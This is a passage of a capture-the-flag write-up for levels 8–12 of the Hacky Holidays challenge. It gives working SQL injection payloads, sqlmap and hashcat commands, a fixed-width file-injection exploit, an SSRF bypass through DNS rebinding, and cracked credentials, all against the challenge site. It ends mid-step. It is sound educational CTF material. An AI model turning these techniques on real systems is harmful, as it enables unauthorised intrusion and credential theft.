+ In `self::$write = new DbConnect( true,  'forum', 'forum','6HgeAZ0qC9T6CQIqJpD' );`, we can see username and password.

`username - forum, password - 6HgeAZ0qC9T6CQIqJpD`.

+ Next up , as we got the database username and password, first I try to logged into /forum/login, but it was incorrect, next up idea was to bruteforce.
+ In bruteforce, I've used the wordlist as -  https://github.com/danielmiessler/SecLists/blob/d5271820d00935387bdff87d0a79ae5513b47ce3/Discovery/Web-Content/api/objects.txt.

+ Executed the command using ffuf tool - `./ffuf -w /Users/kunalpandey/Desktop/objects.txt -u "https://hackyholidays.h1ctf.com/forum/FUZZ" `

{F1139501}

**Response**

```
2                       [Status: 200, Size: 1885, Words: 512, Lines: 58]
1                       [Status: 200, Size: 2249, Words: 788, Lines: 64]
login                   [Status: 200, Size: 1569, Words: 396, Lines: 34]
phpmyadmin              [Status: 200, Size: 8880, Words: 956, Lines: 79]
```

+ So, there is an /forum/phpmyadmin path. I've used the `username - forum, password - 6HgeAZ0qC9T6CQIqJpD` inside phpmyadmin page and logged in successfully, I searched for the tables and finally in the table users, I got the following information:

**Request**
https://hackyholidays.h1ctf.com/forum/phpmyadmin?db=forum&table=user

**Response**

{F1139502}

```
id	username	password	admin
1	grinch	35D652126CA1706B59DB02C93E0C9FBF	1
2	max	388E015BC43980947FCE0E5DB16481D1	
```

+ In the column "admin", it was 1 for username grinch and thus we can say that grinch is an admin. However , password was encrypted. Now, to crack the password, one of the best site can be used over here is https://crackstation.net.

+ In this site, entered the encrypted hash as 35D652126CA1706B59DB02C93E0C9FBF.

{F1139505}

+ Within one second, got the cracked hash as

```
Hash	Type	Result
35D652126CA1706B59DB02C93E0C9FBF	md5	BahHumbug
```

+ So, for username - grinch, password is BahHumbug. Using this credentials, logged in successfully on the page `https://hackyholidays.h1ctf.com/forum/login` and visited the secret plans forum page.

**Request**

https://hackyholidays.h1ctf.com/forum/3/2


**Response**

{F1139510}

```
We've launched our recon server, gathered intelligence and pin pointed Santa's location!
Not long now until we find the IP addresses of his workshop and we can launch the DDoS attack!!!

flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}
```

+ In this way, got the flag which was hidden inside secret forum page after logging in.

Flag 8 - `flag{677db3a0-f9e9-4e7e-9ad7-a9f23e47db8b}`.


**Day 9 - CTF level 9**

+ On day 9, The ctf level launched as "Evil quiz" inside /apps.
+ Visited the page https://hackyholidays.h1ctf.com/evil-quiz and got the workflow as :
On page https://hackyholidays.h1ctf.com/evil-quiz, we can provide any name, after submitting the name, it'll navigate to https://hackyholidays.h1ctf.com/evil-quiz/start and thus, on page https://hackyholidays.h1ctf.com/evil-quiz/score, it'll reflect the score.

{F1139518}

+ There was also an admin area inside evil-quiz which was for logged in.

https://hackyholidays.h1ctf.com/evil-quiz/admin

{F1139520}

+ At this point, I thought to not try bruteforce at all and there will be different method this time. So, on previous ctf levels , it was recon, bruteforce , source -code review and api endpoint exploit. Maybe, this time there might be a case for sql injection. 

+ So, tried common payloads using https://github.com/payloadbox/sql-injection-payload-list on name


```
http
POST /evil-quiz HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 24
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/evil-quiz
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: session=7ef26002a6768edc128fa085f2097475

name=%22+or+sleep%285%29
```
+ Tried payload as " or sleep(5) on name area.

**Payloads**
{F1139545}

+ After injecting, submitting the request on quiz area

```http
POST /evil-quiz/start HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 26
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/evil-quiz/start
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: session=7ef26002a6768edc128fa085f2097475

ques_1=0&ques_2=0&ques_3=0
```

**Response**

```http
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 31 Dec 2020 13:42:56 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Location: /evil-quiz/score
Content-Length: 0
```

+ and then redirected to /evil-quiz/score which was loaded after 5 seconds, that means it was vulnerable to sql injection. This sql injection was of second order because of name was injected on one post request address and output was reflecting on different address `/evil-quiz/score.`

+ In order to exploit even better, I've used tool as sqlmap.

Command - `python sqlmap.py -r exploit.txt -p name --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score"`

where exploit.txt was defined as

```http
POST /evil-quiz HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 24
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/evil-quiz
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8
Cookie: session=7ef26002a6768edc128fa085f2097475

name=%22+or+sleep%285%29
```

{F1139562}

+ Here are command requests and output

**Request**
python sqlmap.py -r exploit.txt -p name --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score"

**Output**
{F1139568}

+ It was detected as a time-based SQL injection on the MySQL database.

**Request**
python sqlmap.py -r exploit.txt -p name --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score" --dbs --exclude-sysdbs

{F1139573}

```
Information_schema
quiz
```

**Request**

python sqlmap.py -r exploit.txt -p name --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score" --tables -D quiz

**Response**

```
Parameter: name (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=hello' AND (SELECT 7752 FROM (SELECT(SLEEP(5)))EvEg) AND 'jenU'='jenU
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12
Database: quiz
[2 tables]
+-------+
| admin |
| quiz  |
+-------+
```

**Request**

python sqlmap.py -r exploit.txt -p name --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score" -T admin -D quiz --columns

**Response**

{F1139598}

```
Parameter: name (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=hello' AND (SELECT 7752 FROM (SELECT(SLEEP(5)))EvEg) AND 'jenU'='jenU
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12
Database: quiz
[2 tables]
+-------+
| admin |
| quiz  |
+-------+

Database: quiz
Table: admin
[3 columns]
+----------+
| Column   |
+----------+
| id       |
| password |
| username |
+----------+

```
+ For admin, we got columns as id, username, and password.

+ Final command will dump the information.

**Request**

python sqlmap.py -r exploit.txt -p name --second-url="https://hackyholidays.h1ctf.com/evil-quiz/score" -T admin -D quiz --dump

**Response**

{F1139603}

```
Parameter: name (POST)
    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: name=hello' AND (SELECT 7752 FROM (SELECT(SLEEP(5)))EvEg) AND 'jenU'='jenU
---
web server operating system: Linux Ubuntu
web application technology: Nginx 1.18.0
back-end DBMS: MySQL >= 5.0.12
Database: quiz
[2 tables]
+-------+
| admin |
| quiz  |
+-------+

Database: quiz
Table: admin
[1 entry]
+----+----------+-------------------+
| id | username | password          |
+----+----------+-------------------+
| 1  | admin    | S3creT_p4ssw0rd-$ |
+----+----------+-------------------+
```

+ After 40 mins of sqlmap, I got username as "admin" and password as "S3creT_p4ssw0rd-$".
+ Next, I visited https://hackyholidays.h1ctf.com/evil-quiz/admin and logged in with the credentials and thus, got the access and the flag.

{F1139611}

```
Evil Quiz Admin
flag{6e8a2df4-5b14-400f-a85a-08a260b59135}
```

+ In this way, we got the flag, this ctf level was about SQL injection attack using second order and it was time-based.

Flag 9 - `flag{6e8a2df4-5b14-400f-a85a-08a260b59135}`

**Day 10 - CTF level 10**

On day 10, it was launched as "https://hackyholidays.h1ctf.com/signup-manager/" on the/apps area.

+ Visit the link and we get the workflow:
There is an option of signup and sign-in function, and once we signin, we get to the user area.

{F1139617}

{F1139618}

+ In the above case, I've registered with username - "test" and password - "test" to see the output, and thus, as we can see there is nothing interesting over there, just a message which says:

`We'll have a look into you and see if you're evil enough to join the grinch army!`

+ At first, I did inspect element on https://hackyholidays.h1ctf.com/signup-manager/, and in the above first line of source-code, one line caught my eye.

```html
<!-- See README.md for assistance -->
<!DOCTYPE html>
<html lang="en">
``` 

+ That means there is a  "README.md" file path over here. After visiting https://hackyholidays.h1ctf.com/signup-manager/README.md, got the following steps describe inside as follows:

```txt
 SignUp Manager

SignUp manager is a simple and easy to use script which allows new users to signup and login to a private page. All users are stored in a file so need for a complicated database setup.

How to Install

1) Create a directory that you wish SignUp Manager to be installed into

2) Move signupmanager.zip into the new directory and unzip it.

3) For security move users.txt into a directory that cannot be read from website visitors

4) Update index.php with the location of your users.txt file

5) Edit the user and admin php files to display your hidden content

6) You can make anyone an admin by changing the last character in the users.txt file to a Y

7) Default login is admin / password
```

+ In the second step, there is a mention of the zip file as "signupmanager.zip ".

+ Thus, by visiting https://hackyholidays.h1ctf.com/signup-manager/signupmanager.zip, downloaded the zip file and extracted it:

```
files list
admin.php
index.php
README.md
signup.php
user.php
```

{F1139625}

+ README.md was the same as mentioned in the above one.
+ In the REAMDE.md file, there is a point 6 which says:

`6) You can make anyone an admin by changing the last character in the users.txt file to a Y`.

+ It means if we write the value "Y" at the last in the users.txt file, we can be admin.

+ Let's look at the index.php function

```php
<?php
if( isset($_GET["logout"]) ){
    setcookie('token',null,time()-3600);
    header("Location: ".explode("?",$_SERVER["REQUEST_URI"])[0]);
    exit();
}
function buildUsers(){
    $users = array();
    $users_txt = file_get_contents('users.txt');
    foreach( explode(PHP_EOL,$users_txt) as $user_str ){
        if( strlen($user_str) == 113 ) {
            $username = str_replace('#', '', substr($user_str, 0, 15));
            $users[$username] = array(
                'username' => $username,
                'password' => str_replace('#', '', substr($user_str, 15, 32)),
                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
            );
        }
    }
    return $users;
}
function addUser($username,$password,$age,$firstname,$lastname){
    $random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
    $line = '';
    $line .= str_pad( $username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
    file_put_contents('users.txt',$line.PHP_EOL, FILE_APPEND);
    return $random_hash;
}
$all_users = buildUsers();
$page = 'signup.php';
if( isset($_COOKIE["token"]) ){
    foreach( $all_users as $u ){
        if( $u["cookie"] === $_COOKIE["token"] ){
            if( $u["admin"] ){
                $page = 'admin.php';
            }else{
                $page = 'user.php';
            }
        }
    }
}
if( $page == 'signup.php' ) {
    $errors = array();
    if (isset($_POST["action"])) {
        if( $_POST["action"] == 'login' && isset($_POST["username"], $_POST["password"]) ){
            if( isset($all_users[ $_POST["username"] ]) ){
                $u = $all_users[ $_POST["username"] ];
                if( md5($_POST["password"]) === $u["password"] ){
                    setcookie('token', $u["cookie"], time() + 3600);
                    header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
                    exit();
                }
            }
            $errors[] = 'Username and password combination not found';
        }
        if ($_POST["action"] == 'signup' && isset($_POST["username"], $_POST["password"], $_POST["age"], $_POST["firstname"], $_POST["lastname"])) {
            $username = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["username"]), 0, 15);
            if (strlen($username) < 3) {
                $errors[] = 'Username must by at least 3 characters';
            } else {
                if (isset($all_users[$username])) {
                    $errors[] = 'Username already exists';
                }
            }
            $password = md5($_POST["password"]);
            $firstname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["firstname"]), 0, 15);
            if (strlen($firstname) < 3) {
                $errors[] = 'First name must by at least 3 characters';
            }
            $lastname = substr(preg_replace('/([^a-zA-Z0-9])/', '', $_POST["lastname"]), 0, 15);
            if (strlen($lastname) < 3) {
                $errors[] = 'Last name must by at least 3 characters';
            }
            if (!is_numeric($_POST["age"])) {
                $errors[] = 'Age entered is invalid';
            }
            if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
            $age = intval($_POST["age"]);
            if (count($errors) === 0) {
                $cookie = addUser($username, $password, $age, $firstname, $lastname);
                setcookie('token', $cookie, time() + 3600);
                header("Location: " . explode("?", $_SERVER["REQUEST_URI"])[0]);
                exit();
            }
        }
    }
}
include_once($page);

```

+ In the code, inside function buildUsers(), we can see there will be 113 characters that are being written inside users.txt file, and in `'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)`, if 113 character will be Y inside users.txt file, then we can become admin.

```php
function buildUsers(){
    $users = array();
    $users_txt = file_get_contents('users.txt');
    foreach( explode(PHP_EOL,$users_txt) as $user_str ){
        if( strlen($user_str) == 113 ) {
            $username = str_replace('#', '', substr($user_str, 0, 15));
            $users[$username] = array(
                'username' => $username,
                'password' => str_replace('#', '', substr($user_str, 15, 32)),
                'cookie' => str_replace('#', '', substr($user_str, 47, 32)),
                'age' => intval(str_replace('#', '', substr($user_str, 79, 3))),
                'firstname' => str_replace('#', '', substr($user_str, 82, 15)),
                'lastname' => str_replace('#', '', substr($user_str, 97, 15)),
                'admin' => ((substr($user_str, 112, 1) === 'Y') ? true : false)
            );
        }
```

+ It means in order to exploit admin access, we have to somehow exploit the signup area. As the signup area was described inside

`function addUser($username,$password,$age,$firstname,$lastname)`

+ Inside function, we can see we've have to exploit last name with capital "Y" to get the access.

```php
$random_hash = md5( print_r($_SERVER,true).print_r($_POST,true).date("U").microtime().rand() );
    $line = '';
    $line .= str_pad( $username,15,"#");
    $line .= $password;
    $line .= $random_hash;
    $line .= str_pad( $age,3,"#");
    $line .= str_pad( $firstname,15,"#");
    $line .= str_pad( $lastname,15,"#");
    $line .= 'N';
    $line = substr($line,0,113);
```

+ Thus, in order to fill up our users.txt for signup functionality, we have to fill up every input field with maximum lengths as well.

+ So, we can see, username - 15, age - 3 , firstname - 15, and password - 15.

+ Now, in the age area we can see the condition as

```php
if (strlen($_POST["age"]) > 3) {
                $errors[] = 'Age entered is too long';
            }
```
+ But in order to fill up further, we have to fill up more than 3 lengths inside the age area. Thus, in order to do that, we can use the power function as 1e2, 1e3,1e4, 1e5,1e6 etc 

where 1e(n) = 1x10 to the power n, thus let's use 1e6 over here.

+ So, our final exploit will be in the signup area where we will insert maximum characters.


**Request**
```
POST /signup-manager/ HTTP/1.1
Host: hackyholidays.h1ctf.com
Connection: close
Content-Length: 122
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: https://hackyholidays.h1ctf.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://hackyholidays.h1ctf.com/signup-manager/
Accept-Encoding: gzip, deflate
Accept-Language: en-GB,en-US;q=0.9,en;q=0.8

action=signup&username=kunalbrokunal12&password=kunalbrokunal12&age=1e6&firstname=kunalbrokunal12&lastname=YYYYYYYYYYYYYYY
```

**Response**

```
HTTP/1.1 302 Found
Server: nginx/1.18.0 (Ubuntu)
Date: Thu, 31 Dec 2020 14:51:29 GMT
Content-Type: text/html; charset=UTF-8
Connection: close
Set-Cookie: token=16e3f0dd617d5ce9dbdba2c5a1f11b2d; expires=Thu, 31-Dec-2020 15:51:29 GMT; Max-Age=3600
Location: /signup-manager/
Content-Length: 0
```

+ After logging in as username- kunalbrokunal12 and password - kunalbrokunal12, we get the flag as we've successfully written the users.txt with capital "Y" at the end.

{F1139655}

```
Admin Area
flag{99309f0f-1752-44a5-af1e-a03e4150757d}

You made it through, continue to your next task here
```

+ There is also a link for CTF level 11 inside the "here" parameter.

Flag 10 - `flag{99309f0f-1752-44a5-af1e-a03e4150757d}`

**Day 11 -CTF level 11**

+ After getting the link from CTF level 10 which is https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59 from the "here" parameter.

+ We get the workflow as :

There are photos and albums area with different hash IDs and different payloads. There is also an option of login area inside the https://hackyholidays.h1ctf.com/attack-box/login.

{F1139661}
{F1139662}

+ A message is also displayed as `We are currently developing an API, apologies for anything that doesn't work quite right`.

+ Thus, it means there can be /api endpoint being used inside r3c0n_server_4fdk59. Thus, finally visiting https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api and we can see different response codes:

**Request**

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api

**Response**

```
Grinch API Status Codes
HTTP Status Code	Explanation
200	Successful request with data returned
204	Successful request but with no data found
404	Invalid Endpoint
400	Invalid GET/POST variable
401	Unauthenticated Request or Invalid client IP
```

+ Also, if we visit any api endpoint like https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/api/aaa, it'll respond as:

```{"error": "This endpoint cannot be visited from this IP address"}```

+ Thus, we can't visit directly, this must be a case of an SSRF based exploit but need to find the right parameter.

+ In the image parameter for album such as https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=59grop

Image was loaded with base64 encoded parameter:

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLzMyZmViYjE5NTcyYjEyNDM1YTZhMzkwYzA4ZThkM2RhLmpwZyIsImF1dGgiOiI3NmJhMDYxZDM1NmM2MjY0YTYwMDUyMTZlMTc3NmJhNiJ9

{F1139675}


+ Decoding the base64 parameter gives the output as:

{"image":"r3c0n_server_4fdk59\/uploads\/32febb19572b12435a6a390c08e8d3da.jpg","auth":"76ba061d356c6264a6005216e1776ba6"}

+ So, I thought to insert api path for ssrf exploit inside the image , so tried the payload as:

```
{"image":"r3c0n_server_4fdk59\/uploads\/..\/api/","auth":"76ba061d356c6264a6005216e1776ba6"} --> encoded base64 parameter --->eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGkvIiwiYXV0aCI6Ijc2YmEwNjFkMzU2YzYyNjRhNjAwNTIxNmUxNzc2YmE2In0=
```

And visited -  https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGkvIiwiYXV0aCI6Ijc2YmEwNjFkMzU2YzYyNjRhNjAwNTIxNmUxNzc2YmE2In0=

**Response**

invalid authentication hash

+ At this point, I was like how we can exploit the functionality, in order to do that, we have to generate a valid hash for the output.

+ So, I was being with no luck and then, visited hacker101 discord channel where adam posted a hint for "inception image".

+ After I tried SQL injection on album parameter to check whether it's a SQL injection case or not, however, it was:

**Request**

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-6860%27%20UNION%20ALL%20SELECT%202,NULL,%22aaa%22--%20-

**Response**

+ In the response, it was returning the album column along with images.

{F1139795}

+ It means select 2 means it was selecting album column and then, it struck about adam's inception hint.

+ In the movie inception, we get the dream inside a dream.

+ Thus, if we are selecting the album column and getting the output, thus there might be a chance of double SQL injection where we can select the photo id and if we somehow add the photo id as a random value, then it might generate valid auth hash from the server.

+ After different testing , finally got the double SQL injection.

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-6860%27%20UNION%20ALL%20SELECT%20%2212%27%20UNION%20ALL%20SELECT%201,1,\%22../api/\%22--%20-%22,NULL,%22aaa%27%22--%20-

**Response**

+ In response, we get the image as:

```html
 <div class="col-md-4">
                        <img class="img-responsive" src="/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcLyIsImF1dGgiOiIwNWE3ZTcwOGE1ZjNkYTc2NTA2MDIzMDQ3NjI4ODI5ZCJ9">
                    </div>
```
**Request**

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/picture?data=eyJpbWFnZSI6InIzYzBuX3NlcnZlcl80ZmRrNTlcL3VwbG9hZHNcLy4uXC9hcGlcLyIsImF1dGgiOiIwNWE3ZTcwOGE1ZjNkYTc2NTA2MDIzMDQ3NjI4ODI5ZCJ9

Base64decoded

`{"image":"r3c0n_server_4fdk59\/uploads\/..\/api\/","auth":"05a7e708a5f3da76506023047628829d"}`

**Response**

Invalid content - type detected.

+ In the SQL injection, in the 3rd column inside SQL injection for column album, we successfully generate a valid hash for ../api/.

+ In the above response, for api, we get the response as the invalid content type detected. So, it means the server was accepting only `content-type image` and since the above /api parameter was of html type, the response was 200 but it was invalid content-type detected.

+ Based on that, I've tried to brute-force the api parameter, thinking about the common path.
+ In the workflow of the application, as we require username and password, thus common api paths can be such as api/config, api/users, api/user, api/username, etc.

+ In the above method, I tried api/config and load the picture in the response on firefox and it returned with:

```Expected HTTP status 200, Received: 404```

{F1139834}

+ Thus as per the response says, it was returned with 404. Finally, after guessing the api as api/user on the above SQL payload as:

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-6860%27%20UNION%20ALL%20SELECT%20%2212%27%20UNION%20ALL%20SELECT%201,1,\%22../api/user/\%22--%20-%22,NULL,%22aaa%27%22--%20-


**Response**

{F1139841}

`Invalid content type detected`

+ As api/user was valid, that means we've to find username and password out of this. In SQL database, when we try to find any character we use the % symbol in the back-end query.

`Select * from users
where username like 'a%' 
`

+ At this concept, I tried to find the username char by char on the above api/user . thus, our final exploit will be

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-6860%27%20UNION%20ALL%20SELECT%20%2212%27%20UNION%20ALL%20SELECT%201,1,\%22../api/user?username=a%\%22--%20-%22,NULL,%22aaa%27%22--%20-

+ If the char will be valid for api/user?username=a%, it'll return with "invalid content type" otherwise "Expected HTTP status 200, Received: 204".

+ So, after bruteforcing for about 20 mins char by char, got the first char as "g " on username, returned with "invalid content-type". 
For the second char, it'll be api/user?username=gr%. After final exploitation for char, got the username as grinchadmin.

**Request**

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-6860%27%20UNION%20ALL%20SELECT%20%2212%27%20UNION%20ALL%20SELECT%201,1,\%22../api/user?username=grinchadmin%\%22--%20-%22,NULL,%22aaa%27%22--%20-

{F1139917}

`Invalid-content type`

+ Similarly, for the password, we can use /api/user?password=a%, after another 20 mins, got the password as "s4nt4sucks".

**Request**

https://hackyholidays.h1ctf.com/r3c0n_server_4fdk59/album?hash=-6860%27%20UNION%20ALL%20SELECT%20%2212%27%20UNION%20ALL%20SELECT%201,1,\%22../api/user?password=s4nt4sucks%\%22--%20-%22,NULL,%22aaa%27%22--%20-


**Response**

{F1139921}

+ Here are the credentials fetched using double SQL injection- username: grinchadmin, password: s4nt4sucks 

+ After using the above credentials inside https://hackyholidays.h1ctf.com/attack-box/login, it was successfully returned with the flag area.

{F1139925}

```
Grinch Network Attack Server
flag{07a03135-9778-4dee-a83c-7ec330728e72}
```

+ Finally, got the flag 11.

+ Flag 11- `flag{07a03135-9778-4dee-a83c-7ec330728e72}`.



**Day12 - CTF level 12**

+ Since I solved flag 11 on day 12, it was already loaded with the level as we can see in the screenshot.
+ Inside https://hackyholidays.h1ctf.com/attack-box, there were three target ips along with an attack option and once we click on the attack option, it'll trigger the payload.

**Request**

https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIyMDMuMC4xMTMuMzMiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==

Decode the base64 payload

{"target":"203.0.113.33","hash":"5f2940d65ca4140cc18d0878bc398955"}

**Response**

+ Redirect to https://hackyholidays.h1ctf.com/attack-box/launch/7e9a25f63e3d1856373c36c9d3e29f89

{F1139926}

+ As per flag 11, if we add random IP over here, it might say the error and I was right:

```
{"target":"127.0.0.1","hash":"5f2940d65ca4140cc18d0878bc398955"}  ---> encode base64 --> eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==
```

**Request**

https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiNWYyOTQwZDY1Y2E0MTQwY2MxOGQwODc4YmMzOTg5NTUifQ==

**Response**

Invalid Protection Hash

+ So as this was the last flag, I didn't think that there might be another case of SQL injection. So, can we try to break the hash itself?
+ Maybe either it can be md5 encrypted or md5 hash salt encrypted.

+ For cracking the hash, one of the best tool is to use "Hashcat".
+ In order to crack the hash, we need 3 or more hashes inside hash file.

+ So, for target 203.0.113.33, 203.0.113.53 and 203.0.113.213, decoded the attack payload and got the 3 hashes that I've stored inside hashes file as:

```
5f2940d65ca4140cc18d0878bc398955:203.0.113.33
2814f9c7311a82f1b822585039f62607:203.0.113.53
5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213
```

+ We also need a wordlist, so I've downloaded the rockyou.txt file for this one.

+ Final command to crack using hashcat

hashcat -m 10 hashes rockyou.txt -O 
hashcat -m 10 hashes rockyou.txt --show

{F1139931}

```
5f2940d65ca4140cc18d0878bc398955:203.0.113.33:mrgrinch463
2814f9c7311a82f1b822585039f62607:203.0.113.53:mrgrinch463
5aa9b5a497e3918c0e1900b2a2228c38:203.0.113.213:mrgrinch463
```

+ Thus, we got salt as mrgrinch463.

+ As per the level, the grinch is trying to attack Santa's server. Thus, in order to stop the grinch, we need to perform an attack on the localhost or 127.0.0.1, then the grinch can be stopped.

**Generating hash for 127.0.0.1 using salt mrgrinch463 and encrypt base64**

```
mrgrinch463127.0.0.1 -----> md5 salted ---> 3e3f8df1658372edf0214e202acb460b ----> use in the above format as {"target":"","hash":""} ----->

{"target":"127.0.0.1","hash":"3e3f8df1658372edf0214e202acb460b"} ---> encrypt base64 --> eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==
```

+ Our final payload in the url will be:

https://hackyholidays.h1ctf.com/attack-box/launch?payload=eyJ0YXJnZXQiOiIxMjcuMC4wLjEiLCJoYXNoIjoiM2UzZjhkZjE2NTgzNzJlZGYwMjE0ZTIwMmFjYjQ2MGIifQ==

**Response**

https://hackyholidays.h1ctf.com/attack-box/launch/1dabfbbbea602fefc21f33e24b399833

{F1139937}

+Connection aborted, looks like localhost can't be attacked directly.

+ In the ssrf bypass for the above case (127.0.0.1), I've tried decimal, octal, and differents encoding, didn't worked, tried location header exploit didn't work. 

+ So, I left my computer for a while and got an idea as this CTF was also organized by nahamsec, there might be a case of DNS rebinding attack. [As per Snapchat ssrf exploit which I've already seen]

+ To perform DNS rebinding attacks, I've gone through https://github.com/taviso/rbndr.

In the https://github.com/taviso/rbndr, there was a site as 7f000001.c0a80001.rbndr.us

+ Which it was configured with 127.0.0.1 and 192.168.0.1



finally encrypted with md5 hash salt

```
mrgrinch463mrgrinch4637f000001.c0a80001.rbndr.us

MD5 encrypted salt - de9d82d4ae9a61660701e7e1844ea643

{"target":"7f000001.c0a80001.rbndr.us","hash":"de9d82d4ae9a61660701e7e1844ea643"}

base64 encode

eyJ0YXJnZXQiOiI3ZjAwMDAwMS5jMGE4MDAwMS5yYm5kci51cyIsImhhc2giOiJkZTlkODJkNGFlOWE2MTY2MDcwMWU3ZTE4NDRlYTY0MyJ9
```

+ So, our final payload will be: 

